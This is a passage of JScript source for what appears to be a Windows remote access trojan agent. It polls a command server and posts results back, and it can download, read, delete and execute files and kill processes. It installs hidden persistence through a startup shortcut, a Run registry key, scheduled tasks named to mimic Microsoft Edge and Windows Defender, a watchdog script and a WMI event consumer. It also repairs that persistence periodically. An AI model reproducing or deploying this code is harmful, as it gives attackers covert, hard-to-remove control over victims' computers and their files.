        return result;
        
    } catch (e) {
        return "Download error: " + e.message + "\n";
    }
}

// Add this to your executeCommand function
function handleDownload(command) {
    var parts = command.split(' ');
    if (parts.length >= 2) {
        return universalDownload(parts[0], parts[1]);
    }
    return "Usage: download <url> <destination>";
}

// ========== SYSTEM INFO ==========
function getSystemInfo() {
    var info = "=== System Information ===\n";
    info += "OS: " + getWindowsVersion() + "\n";
    info += "Computer: " + network.ComputerName + "\n";
    info += "User: " + network.UserName + "\n";
    info += "IP: " + getLocalIP() + "\n";
    info += "MAC: " + getMacAddress() + "\n";
    info += "Domain: " + network.UserDomain + "\n";
    info += "\n=== Client Info ===\n";
    info += "Client ID: " + CONFIG.CLIENT_ID + "\n";
    info += "Session: " + (sessionToken ? sessionToken.substring(0, 8) + "..." : "None") + "\n";
    info += "Current Dir: " + currentDirectory + "\n";
    info += "Poll Count: " + pollCount + "\n";
    info += "Uptime: " + Math.floor((new Date().getTime() - connectionStartTime) / 1000) + "s\n";
    return info;
}

// ========== PROCESS LIST ==========
function getProcessList() {
    try {
        var exec = WshShell.Exec("%comspec% /c tasklist /FO CSV /V");
        while (exec.Status == 0) {
            WScript.Sleep(10);
        }
        var output = exec.StdOut.ReadAll();
        return "Process List\n========================================\n" + output;
    } catch (e) {
        return "Error getting process list: " + e.message;
    }
}

// ========== FILE OPERATIONS ==========
function listFiles(path) {
    try {
        if (!path || trim(path) == "") { // FIXED: using custom trim
            path = currentDirectory;
        }
        
        if (!fso.FolderExists(path)) {
            return "Directory does not exist: " + path;
        }
        
        var folder = fso.GetFolder(path);
        var result = "Directory listing: " + folder.Path + "\n";
        result += "========================================\n";
        result += "Name                                Size        Modified\n";
        result += "--------------------------------------------------------\n";
        
        var subFolders = new Enumerator(folder.SubFolders);
        for (; !subFolders.atEnd(); subFolders.moveNext()) {
            var f = subFolders.item();
            result += f.Name + "/\n";
        }
        
        var files = new Enumerator(folder.Files);
        for (; !files.atEnd(); files.moveNext()) {
            var f = files.item();
            var size = formatSize(f.Size);
            var modified = f.DateLastModified;
            result += f.Name + "  " + size + "  " + modified + "\n";
        }
        
        return result;
    } catch (e) {
        return "Error listing files: " + e.message;
    }
}

function listRootDrives() {
    try {
        var result = "Root Drives\n========================================\n";
        var drives = new Enumerator(fso.Drives);
        for (; !drives.atEnd(); drives.moveNext()) {
            var drive = drives.item();
            result += drive.DriveLetter + ":\\ - ";
            if (drive.IsReady) {
                result += drive.DriveType + " - " + formatSize(drive.FreeSpace) + " free\n";
            } else {
                result += "Not Ready\n";
            }
        }
        return result;
    } catch (e) {
        return "Error listing drives: " + e.message;
    }
}

function readFile(filePath) {
    try {
        if (!fso.FileExists(filePath)) {
            return "File not found: " + filePath;
        }
        
        var file = fso.GetFile(filePath);
        if (file.Size > 1048576) {
            return "File too large: " + formatSize(file.Size) + " (limit: 1MB)";
        }
        
        var stream = fso.OpenTextFile(filePath, 1);
        var content = stream.ReadAll();
        stream.Close();
        
        return "File: " + filePath + "\nSize: " + formatSize(file.Size) + "\n========================================\n" + content;
    } catch (e) {
        return "Error reading file: " + e.message;
    }
}

function deleteFile(filePath) {
    try {
        if (fso.FileExists(filePath)) {
            fso.DeleteFile(filePath);
            return "Deleted file: " + filePath;
        } else if (fso.FolderExists(filePath)) {
            fso.DeleteFolder(filePath);
            return "Deleted folder: " + filePath;
        } else {
            return "File/folder not found: " + filePath;
        }
    } catch (e) {
        return "Error deleting: " + e.message;
    }
}

function createFolder(path) {
    try {
        if (fso.FolderExists(path)) {
            return "Folder already exists: " + path;
        }
        fso.CreateFolder(path);
        return "Created folder: " + path;
    } catch (e) {
        return "Error creating folder: " + e.message;
    }
}

function copyFile(command) {
    try {
        var parts = command.split(":");
        if (parts.length < 2) return "Invalid format. Use: source:destination";
        
        var source = parts[0];
        var dest = parts[1];
        
        if (!fso.FileExists(source)) {
            return "Source file not found: " + source;
        }
        
        fso.CopyFile(source, dest, true);
        return "Copied: " + source + " -> " + dest;
    } catch (e) {
        return "Error copying file: " + e.message;
    }
}

function moveFile(command) {
    try {
        var parts = command.split(":");
        if (parts.length < 2) return "Invalid format. Use: source:destination";
        
        var source = parts[0];
        var dest = parts[1];
        
        if (!fso.FileExists(source)) {
            return "Source file not found: " + source;
        }
        
        fso.MoveFile(source, dest);
        return "Moved: " + source + " -> " + dest;
    } catch (e) {
        return "Error moving file: " + e.message;
    }
}

function renameFile(command) {
    try {
        var parts = command.split(":");
        if (parts.length < 2) return "Invalid format. Use: oldname:newname";
        
        var oldPath = parts[0];
        var newName = parts[1];
        
        if (!fso.FileExists(oldPath)) {
            return "File not found: " + oldPath;
        }
        
        var file = fso.GetFile(oldPath);
        file.Name = newName;
        return "Renamed to: " + newName;
    } catch (e) {
        return "Error renaming file: " + e.message;
    }
}

function getFileProperties(filePath) {
    try {
        if (!fso.FileExists(filePath) && !fso.FolderExists(filePath)) {
            return "File/folder not found: " + filePath;
        }
        
        var item = fso.FileExists(filePath) ? fso.GetFile(filePath) : fso.GetFolder(filePath);
        
        var props = "=== File Properties ===\n";
        props += "Name: " + item.Name + "\n";
        props += "Path: " + item.Path + "\n";
        props += "Size: " + formatSize(item.Size) + "\n";
        props += "Type: " + item.Type + "\n";
        props += "Created: " + item.DateCreated + "\n";
        props += "Modified: " + item.DateLastModified + "\n";
        props += "Accessed: " + item.DateLastAccessed + "\n";
        props += "Attributes: " + item.Attributes + "\n";
        
        return props;
    } catch (e) {
        return "Error getting properties: " + e.message;
    }
}

function openFile(filePath) {
    try {
        if (!fso.FileExists(filePath)) {
            return "File not found: " + filePath;
        }
        
        WshShell.Run('"' + filePath + '"', 1, false);
        return "Opened file: " + filePath;
    } catch (e) {
        return "Error opening file: " + e.message;
    }
}

function executeFile(filePath) {
    try {
        if (!fso.FileExists(filePath)) {
            return "File not found: " + filePath;
        }
        
        var exec = WshShell.Exec('"' + filePath + '"');
        WScript.Sleep(2000);
        
        if (exec.Status == 0) {
            return "Executed file: " + filePath + " (running in background)";
        } else {
            var output = exec.StdOut.ReadAll();
            var error = exec.StdErr.ReadAll();
            return "Executed: " + filePath + "\n" + output + (error ? "\n[ERROR]\n" + error : "");
        }
    } catch (e) {
        return "Error executing file: " + e.message;
    }
}

function killProcess(pid) {
    try {
        var exec = WshShell.Exec("%comspec% /c taskkill /F /PID " + pid);
        while (exec.Status == 0) {
            WScript.Sleep(10);
        }
        var output = exec.StdOut.ReadAll();
        return "Kill process PID " + pid + ":\n" + output;
    } catch (e) {
        return "Error killing process: " + e.message;
    }
}

function killAgent() {
    WScript.Quit(0);
    return "Agent terminated";
}

function formatSize(bytes) {
    if (bytes < 1024) return bytes + " B";
    if (bytes < 1048576) return Math.round(bytes / 1024) + " KB";
    if (bytes < 1073741824) return Math.round(bytes / 1048576) + " MB";
    return Math.round(bytes / 1073741824) + " GB";
}

// ========== PERSISTENCE MECHANISMS (COMPLETE) ==========

function installPersistence() {
    if (!IS_INSTALLED || !INSTALLED_SCRIPT) {
        return false;
    }
    
    try {
        var methods = [];
        
        // Method 1: Startup Folder (User)
        if (addStartupShortcut()) {
            methods.push("Startup");
        }
        
        // Method 2: Run Registry Key (User)
        if (addRunRegistryKey()) {
            methods.push("Registry");
        }
        
        // Method 3: Scheduled Task (runs every 10 minutes)
        if (addScheduledTask()) {
            methods.push("ScheduledTask");
        }
        
        // Method 4: Watchdog Task (monitors main process every 5 minutes)
        if (addWatchdogTask()) {
            methods.push("Watchdog");
        }
        
        // Method 5: WMI Event Consumer (advanced)
        if (addWMIEventConsumer()) {
            methods.push("WMI");
        }
        
        if (methods.length > 0) {
            return true;
        }
        
        return false;
        
    } catch (e) {
        return false;
    }
}

function addStartupShortcut() {
    try {
        var startupDir = WshShell.SpecialFolders("Startup");
        
        if (!startupDir || startupDir == "") {
            // Fallback to manual path
            var appData = WshShell.ExpandEnvironmentStrings("%APPDATA%");
            startupDir = fso.BuildPath(appData, "Microsoft\\Windows\\Start Menu\\Programs\\Startup");
        }
        
        if (!fso.FolderExists(startupDir)) {
            return false;
        }
        
        // Use FIXED shortcut name (not random)
        var shortcutName = "Windows Update Assistant.lnk";
        var shortcutPath = fso.BuildPath(startupDir, shortcutName);
        
        // Check if shortcut already exists and points to our script
        if (fso.FileExists(shortcutPath)) {
            try {
                var existingShortcut = WshShell.CreateShortcut(shortcutPath);
                if (existingShortcut.Arguments.toLowerCase().indexOf(INSTALLED_SCRIPT.toLowerCase()) > -1) {
                    return true; // Already installed correctly
                }
            } catch (e) {}
        }
        
        var shortcut = WshShell.CreateShortcut(shortcutPath);
        shortcut.TargetPath = "wscript.exe";
        // CRITICAL FIX: Add //B flag to prevent ANY window flash
        shortcut.Arguments = '//B //Nologo "' + INSTALLED_SCRIPT + '"';
        shortcut.WindowStyle = 0; // Hidden
        shortcut.Description = "Windows System Component";
        shortcut.WorkingDirectory = INSTALL_DIR;
        shortcut.Save();
        
        // Hide the shortcut - FIXED: Window style 0 prevents CMD flash
        try {
            setHidden(shortcutPath);
        } catch (e) {}
        
        return true;
        
    } catch (e) {
        return false;
    }
}

function addRunRegistryKey() {
    try {
        // Use HKCU (current user) - doesn't require admin
        var regPath = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\";
        
        // Use FIXED key name (not random)
        var keyName = "WindowsUpdateAgent";
        var keyPath = regPath + keyName;
        
        // Check if key already exists
        try {
            var existingValue = WshShell.RegRead(keyPath);
            if (existingValue && existingValue.toLowerCase().indexOf(INSTALLED_SCRIPT.toLowerCase()) > -1) {
                return true; // Already installed correctly
            }
        } catch (e) {
            // Key doesn't exist, continue to create
        }
        
        // Create registry entry with //B flag to prevent window flash
        var command = 'wscript.exe //B //Nologo "' + INSTALLED_SCRIPT + '"';
        WshShell.RegWrite(keyPath, command, "REG_SZ");
        
        return true;
        
    } catch (e) {
        return false;
    }
}

// ========== CRITICAL FIX: SINGLE SCHEDULED TASK ==========
function addScheduledTask() {
    try {
        // Use FIXED task name (not random) - prevents duplicates
        var taskName = "MicrosoftEdgeUpdateCore";
        
        // Check if task already exists - SILENTLY (no Exec)
        var taskExists = false;
        try {
            // Create a VBScript file to check task existence silently
            var tempDir = fso.GetSpecialFolder(2);
            var tempVbs = fso.BuildPath(tempDir, "chk_" + Math.floor(Math.random() * 10000) + ".vbs");
            
            var vbsContent = 'On Error Resume Next\n' +
                'Set objShell = CreateObject("WScript.Shell")\n' +
                'result = objShell.Run("schtasks /query /tn ""' + taskName + '"" >nul 2>&1", 0, True)\n' +
                'WScript.Quit result\n';
            
            var file = fso.CreateTextFile(tempVbs, true);
            file.Write(vbsContent);
            file.Close();
            
            // Run VBScript silently
            var exitCode = WshShell.Run('wscript.exe //B //Nologo "' + tempVbs + '"', 0, true);
            
            // Clean up
            try { fso.DeleteFile(tempVbs); } catch (e) {}
            
            if (exitCode == 0) {
                return true; // Task exists - SUCCESS (no duplicate)
            }
            
        } catch (e) {
            // Continue to create task
        }
        
        // Task doesn't exist - create it using VBScript (silent)
        var tempDir2 = fso.GetSpecialFolder(2);
        var tempVbs2 = fso.BuildPath(tempDir2, "add_" + Math.floor(Math.random() * 10000) + ".vbs");
        
        // IMPROVED: Run every 10 minutes instead of 1 hour for faster recovery
        var vbsContent2 = 'On Error Resume Next\n' +
            'Set objShell = CreateObject("WScript.Shell")\n' +
            'cmd = "schtasks /create /tn ""' + taskName + '"" ' +
            '/tr ""wscript.exe //B //Nologo \\""' + INSTALLED_SCRIPT + '\\"""" ' +
            '/sc minute /mo 10 /f /rl highest"\n' +
            'result = objShell.Run(cmd, 0, True)\n' +
            'WScript.Quit result\n';
        
        var file2 = fso.CreateTextFile(tempVbs2, true);
        file2.Write(vbsContent2);
        file2.Close();
        
        var exitCode2 = WshShell.Run('wscript.exe //B //Nologo "' + tempVbs2 + '"', 0, true);
        
        // Clean up
        try { fso.DeleteFile(tempVbs2); } catch (e) {}
        
        return (exitCode2 == 0);
        
    } catch (e) {
        return false;
    }
}

// ========== WATCHDOG TASK: MONITORS AND RESTARTS AGENT ==========
function addWatchdogTask() {
    try {
        var taskName = "WindowsDefenderScheduledScan";
        
        // Check if watchdog task already exists
        try {
            var tempDir = fso.GetSpecialFolder(2);
            var checkVbs = fso.BuildPath(tempDir, "chkwd_" + Math.floor(Math.random() * 10000) + ".vbs");
            
            var vbsCheck = 'On Error Resume Next\n' +
                'Set objShell = CreateObject("WScript.Shell")\n' +
                'result = objShell.Run("schtasks /query /tn ""' + taskName + '"" >nul 2>&1", 0, True)\n' +
                'WScript.Quit result\n';
            
            var f = fso.CreateTextFile(checkVbs, true);
            f.Write(vbsCheck);
            f.Close();
            
            var exitCode = WshShell.Run('wscript.exe //B //Nologo "' + checkVbs + '"', 0, true);
            try { fso.DeleteFile(checkVbs); } catch (e) {}
            
            if (exitCode == 0) {
                return true; // Watchdog already exists
            }
        } catch (e) {}
        
        // Create watchdog VBScript
        var watchdogScript = fso.BuildPath(INSTALL_DIR, "wdscan.vbs");
        
        var watchdogContent = 'On Error Resume Next\n' +
            'Set objWMI = GetObject("winmgmts:\\\\.\\root\\cimv2")\n' +
            'Set colProcesses = objWMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name = \'wscript.exe\'")\n' +
            '\n' +
            'isRunning = False\n' +
            'For Each objProcess In colProcesses\n' +
            '    cmdLine = objProcess.CommandLine\n' +
            '    If Not IsNull(cmdLine) Then\n' +
            '        If InStr(LCase(cmdLine), "' + fso.GetFileName(INSTALLED_SCRIPT).toLowerCase() + '") > 0 Then\n' +
            '            isRunning = True\n' +
            '            Exit For\n' +
            '        End If\n' +
            '    End If\n' +
            'Next\n' +
            '\n' +
            'If Not isRunning Then\n' +
            '    Set objShell = CreateObject("WScript.Shell")\n' +
            '    objShell.Run "wscript.exe //B //Nologo ""' + INSTALLED_SCRIPT + '""", 0, False\n' +
            'End If\n';
        
        var f2 = fso.CreateTextFile(watchdogScript, true);
        f2.Write(watchdogContent);
        f2.Close();
        
        // Hide watchdog script
        try {
            setHidden(watchdogScript);
        } catch (e) {}
        
        // Create scheduled task for watchdog (runs every 5 minutes)
        var tempDir2 = fso.GetSpecialFolder(2);
        var createVbs = fso.BuildPath(tempDir2, "addwd_" + Math.floor(Math.random() * 10000) + ".vbs");
        
        var vbsCreate = 'On Error Resume Next\n' +
            'Set objShell = CreateObject("WScript.Shell")\n' +
            'cmd = "schtasks /create /tn ""' + taskName + '"" ' +
            '/tr ""wscript.exe //B //Nologo \\""' + watchdogScript + '\\"""" ' +
            '/sc minute /mo 5 /f /rl highest"\n' +
            'result = objShell.Run(cmd, 0, True)\n' +
            'WScript.Quit result\n';
        
        var f3 = fso.CreateTextFile(createVbs, true);
        f3.Write(vbsCreate);
        f3.Close();
        
        var exitCode2 = WshShell.Run('wscript.exe //B //Nologo "' + createVbs + '"', 0, true);
        try { fso.DeleteFile(createVbs); } catch (e) {}
        
        return (exitCode2 == 0);
        
    } catch (e) {
        return false;
    }
}

// ========== WMI EVENT CONSUMER (ADVANCED PERSISTENCE) ==========
function addWMIEventConsumer() {
    try {
        // Advanced WMI persistence (requires elevated privileges, fail silently)
        // This creates a WMI event that triggers on user logon
        
        var vbsContent = 'On Error Resume Next\n' +
            'Set objWMI = GetObject("winmgmts:\\\\.\\root\\subscription")\n' +
            'Set objFilter = objWMI.Get("__EventFilter").SpawnInstance_()\n' +
            'objFilter.Name = "WindowsSystemFilter"\n' +
            'objFilter.EventNameSpace = "root\\cimv2"\n' +
            'objFilter.QueryLanguage = "WQL"\n' +
            'objFilter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"\n' +
            'Set objFilterPath = objFilter.Put_\n' +
            'Set objConsumer = objWMI.Get("CommandLineEventConsumer").SpawnInstance_()\n' +
            'objConsumer.Name = "WindowsSystemConsumer"\n' +
            'objConsumer.CommandLineTemplate = "wscript.exe //B //Nologo \\"' + INSTALLED_SCRIPT + '\\""\n' +
            'Set objConsumerPath = objConsumer.Put_\n' +
            'Set objBinding = objWMI.Get("__FilterToConsumerBinding").SpawnInstance_()\n' +
            'objBinding.Filter = objFilterPath.Path\n' +
            'objBinding.Consumer = objConsumerPath.Path\n' +
            'objBinding.Put_\n' +
            'WScript.Quit 0\n';
        
        var tempVbs = fso.BuildPath(fso.GetSpecialFolder(2), "wmi_" + Math.floor(Math.random() * 10000) + ".vbs");
        var file = fso.CreateTextFile(tempVbs, true);
        file.Write(vbsContent);
        file.Close();
        
        // Run with wscript //B instead of cscript to eliminate CMD flash
        var exitCode = WshShell.Run('wscript.exe //B //Nologo "' + tempVbs + '"', 0, true);
        
        // Clean up temp file
        try {
            fso.DeleteFile(tempVbs);
        } catch (e) {}
        
        return (exitCode == 0);
        
    } catch (e) {
        return false;
    }
}

function checkAndRepairPersistence() {
    // Periodically check if persistence is still in place and repair if needed
    try {
        // Re-install all persistence methods (they check for existence internally)
        addStartupShortcut();
        addRunRegistryKey();
        addScheduledTask();
        addWatchdogTask();
        
        return true;
        
    } catch (e) {
        return false;
    }
}

// ========== COMPLETE REMOVE PERSISTENCE FUNCTION ==========
function removePersistence() {
    // For cleanup/uninstall - removes all persistence mechanisms
    try {
        // Remove startup shortcuts
        var startupDir = WshShell.SpecialFolders("Startup");
        if (startupDir && fso.FolderExists(startupDir)) {
            var shortcutPath = fso.BuildPath(startupDir, "Windows Update Assistant.lnk");
            if (fso.FileExists(shortcutPath)) {
                try {
                    fso.DeleteFile(shortcutPath);
                } catch (e) {}
            }
        }
        
        // Remove registry key
        try {
            var regPath = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdateAgent";
            WshShell.RegDelete(regPath);
        } catch (e) {}
        
        // Remove main scheduled task
        try {
            var vbs1 = fso.BuildPath(fso.GetSpecialFolder(2), "rm1_" + Math.floor(Math.random()*9999) + ".vbs");
            var content1 = 'CreateObject("WScript.Shell").Run "schtasks /delete /tn ""MicrosoftEdgeUpdateCore"" /f >nul 2>&1", 0, True';
            fso.CreateTextFile(vbs1, true).Write(content1);
            WshShell.Run('wscript.exe //B //Nologo "' + vbs1 + '"', 0, true);
            try { fso.DeleteFile(vbs1); } catch(e) {}
        } catch (e) {}
        
        // Remove watchdog scheduled task
        try {
            var vbs2 = fso.BuildPath(fso.GetSpecialFolder(2), "rm2_" + Math.floor(Math.random()*9999) + ".vbs");
            var content2 = 'CreateObject("WScript.Shell").Run "schtasks /delete /tn ""WindowsDefenderScheduledScan"" /f >nul 2>&1", 0, True';
            fso.CreateTextFile(vbs2, true).Write(content2);
            WshShell.Run('wscript.exe //B //Nologo "' + vbs2 + '"', 0, true);
            try { fso.DeleteFile(vbs2); } catch(e) {}
        } catch (e) {}
        
        // Remove watchdog script
        try {
            var watchdogScript = fso.BuildPath(INSTALL_DIR, "wdscan.vbs");
            if (fso.FileExists(watchdogScript)) {
                fso.DeleteFile(watchdogScript);
            }
        } catch (e) {}
        
        return true;
        
    } catch (e) {
        return false;
    }
}

// ========== PERSISTENCE COMMAND HANDLER ==========
function handlePersistenceCommand(action) {
    try {
        if (action == "INSTALL" || action == "ADD" || action == "ENABLE") {
            if (installPersistence()) {
                return "Persistence mechanisms installed successfully";
            } else {
                return "Failed to install persistence (may require elevated privileges)";
            }
        } else if (action == "REMOVE" || action == "DELETE" || action == "DISABLE") {
            if (removePersistence()) {
                return "Persistence mechanisms removed successfully";
            } else {
                return "Failed to remove persistence";
            }
        } else if (action == "REPAIR" || action == "CHECK") {
            if (checkAndRepairPersistence()) {
                return "Persistence checked and repaired";
            } else {
                return "Failed to check persistence";
            }
        } else {
            return "Unknown persistence action: " + action + "\nValid actions: INSTALL, REMOVE, REPAIR";
        }
    } catch (e) {
        return "Persistence error: " + e.message;
    }
}

// ========== EXECUTE AND SEND ==========
function executeAndSendResult(taskId, command, type) {
    var result = executeCommand(command, type);
    sendResult(taskId, result);
}

function sendResult(taskId, result) {
    try {
        var resultData = "taskId=" + encodeURIComponent(taskId) +
                        "&agentId=" + encodeURIComponent(CONFIG.CLIENT_ID) +
                        "&result=" + encodeURIComponent(result) +
                        "&session=" + encodeURIComponent(sessionToken ? sessionToken : "");
        
        var response = httpRequest(CONFIG.SERVER + "/result", "POST", resultData);
        
        return response.success;
    } catch (e) {
        return false;
    }
}

// ========== SESSION VALIDATION ==========
function ensureValidSession() {
    // If no session token, try to register
    if (!sessionToken) {
        return performRegistration();
    }
    return true;
}

// ========== MAIN ==========
function main() {
  
    initializeStealth();
    
    if (!IS_INSTALLED) {
        WScript.Quit(0);
    }
    
    CONFIG.CLIENT_ID = generateClientId();
    
    // Install persistence automatically
    installPersistence();
    
    // Initial registration
    var registered = false;
    var retryCount = 0;
    
    while (!registered && retryCount < 30) { // Increased retry count
        registered = performRegistration();
        if (!registered) {
            retryCount++;
            WScript.Sleep(5000);
        }
    }
    
    sendHeartbeat();
    
    // Persistence repair check counter
    var persistenceCheckCounter = 0;
    var registrationCheckCounter = 0;
    
    while (true) {
        try {
            pollCount++;
            registrationCheckCounter++;
            
            // CRITICAL: Poll for commands using /register endpoint (working version)
            pollForCommands();
            
            if (shouldSendHeartbeat()) {
                sendHeartbeat();
            }
            
            // Periodically check persistence
            persistenceCheckCounter++;
            if (persistenceCheckCounter >= 100) {
                checkAndRepairPersistence();
                persistenceCheckCounter = 0;
            }
            
            // Periodically ensure session is valid (every 10 polls)
            if (registrationCheckCounter >= 10) {
                if (!sessionToken) {
                    performRegistration();
                }
                registrationCheckCounter = 0;
            }
            
        } catch (e) {
            // Silent error handling
        }
        
        WScript.Sleep(CONFIG.POLL_INTERVAL * 1000);
    }
}

// ========== START ==========
try {
    main();
} catch (e) {
    WScript.Sleep(3000);
}
